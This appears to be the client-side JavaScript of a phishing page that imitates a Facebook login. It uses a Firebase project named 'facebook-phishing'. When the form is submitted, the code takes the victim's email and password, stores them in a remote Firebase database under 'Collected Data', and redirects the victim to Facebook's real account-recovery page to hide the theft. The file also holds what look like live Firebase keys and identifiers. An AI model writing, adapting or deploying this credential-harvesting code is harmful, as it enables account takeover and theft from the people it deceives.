var firebaseConfig = {
  apiKey: "AIzaSyAWy9dGFWtqKIs9hHd17U5gYW7H7PCiVCU",
  authDomain: "facebook-phishing-5ceeb.firebaseapp.com",
  databaseURL: "https://facebook-phishing-5ceeb-default-rtdb.firebaseio.com",
  projectId: "facebook-phishing-5ceeb",
  storageBucket: "facebook-phishing-5ceeb.appspot.com",
  messagingSenderId: "722792850020",
  appId: "1:722792850020:web:0f2ba2021e4a03bee8b571",
  measurementId: "G-9WSMP522RW"
};

firebase.initializeApp(firebaseConfig);
document.getElementById('contactForm')
.addEventListener('submit', submitForm);

var MessageRef = firebase.database().ref('Collected Data');

function submitForm(e) {

    e.preventDefault();

    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');

    saveMessage(email, password);
    document.getElementById('contactForm').reset();
    setTimeout(function() {
        location = 'https://www.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&_rdr'
    }, 100)
}

// Function to get get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(email, password) {
    var newMessageRef = MessageRef.push();
    newMessageRef.set({
        email: email,
        password: password,
    });
}
